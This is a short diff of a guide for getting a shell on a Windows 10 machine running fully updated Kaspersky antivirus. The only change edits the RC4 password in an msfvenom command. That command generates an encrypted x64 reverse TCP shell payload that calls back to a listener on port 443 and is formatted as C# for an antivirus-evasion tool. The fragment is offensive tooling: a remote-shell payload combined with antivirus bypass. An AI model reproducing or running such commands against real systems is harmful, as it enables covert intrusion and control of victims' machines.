@@ -35,7 +35,7 @@ Getting a shell in a windows 10 machine running fully updated kaspersky AV
 
 1. Create the payload using msfvenom 
 
-    msfvenom -p windows/x64/shell/reverse_tcp_rc4 LHOST=10.0.2.15 LPORT=443 EXITFUNC=thread RC4PASSWORD=17DV11 -f csharp
+    msfvenom -p windows/x64/shell/reverse_tcp_rc4 LHOST=10.0.2.15 LPORT=443 EXITFUNC=thread RC4PASSWORD=S3cr3TP4ssw0rd -f csharp
 
 2. Use AVIator with the following settings
 
